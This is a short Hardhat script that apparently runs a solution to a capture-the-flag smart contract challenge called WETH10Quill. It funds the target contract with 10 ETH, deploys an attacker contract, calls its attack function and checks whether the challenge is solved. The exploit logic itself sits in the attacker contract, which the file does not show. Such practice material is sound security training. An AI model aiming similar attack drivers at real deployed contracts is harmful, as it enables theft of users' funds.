import chalk from "chalk";
import { ethers } from "hardhat";
import { WETH10Quill__factory, WETH10Quill, WETH10QuillAttack__factory } from "../../typechain";
import { log, initialize } from "../utils";

async function main() {
    let [weth10QuillContract, attacker] = await initialize<WETH10Quill>(WETH10Quill__factory);
    let deployer = (await ethers.getSigners())[0];
    let tx = await deployer.sendTransaction({
        to: await weth10QuillContract.getAddress(),
        value: ethers.parseEther("10"),
    })
    await tx.wait();
    log(`WETH10 balance: ${chalk.yellow(ethers.formatEther(await ethers.provider.getBalance(await weth10QuillContract.getAddress())))} ETH`);


    let weth10Attack = await new WETH10QuillAttack__factory(attacker).deploy();
    await weth10Attack.waitForDeployment();

    tx = await weth10Attack.attack(await weth10QuillContract.getAddress(), {value: ethers.parseEther("1")});
    await tx.wait();

    log(`Is solved: ${chalk.yellow(await weth10QuillContract.isSolved())}`); 
    
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});